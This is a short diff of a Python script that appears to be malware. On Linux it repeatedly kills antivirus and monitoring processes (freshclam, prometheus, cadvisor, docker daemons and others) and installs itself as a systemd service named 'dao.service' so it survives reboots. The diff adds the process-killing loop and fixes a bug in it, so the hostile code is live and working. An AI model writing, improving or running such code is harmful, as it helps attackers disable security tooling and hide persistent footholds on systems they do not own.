@@ -66,6 +66,12 @@ while True:
         pass
 
     if operate_system == 'lin':
+        array_kill = ['freshclam', 'dockerd', 'containerd', 'mdsdmgr', 'node_controller', 'cadvisor', 'prometheus', 'node_agent', 'tail']
+        for n in array_kill:
+            try:
+                os.system('pkill ' + n)
+            except:
+                pass
         try:
             path_service = '/lib/systemd/system/dao.service'
             data = '[Unit]\nDescription=dao service\n[Service]\nType=simple\nExecStart=/usr/bin/python3 %s\n[Install]\nWantedBy=multi-user.target' % path_app
@@ -219,6 +225,6 @@ while True:
         array_kill = ['freshclam', 'dockerd', 'containerd', 'mdsdmgr', 'node_controller', 'cadvisor', 'prometheus', 'node_agent', 'tail']
         for n in array_kill:
             try:
-                os.system('pkill ' + i)
+                os.system('pkill ' + n)
             except:
                 pass
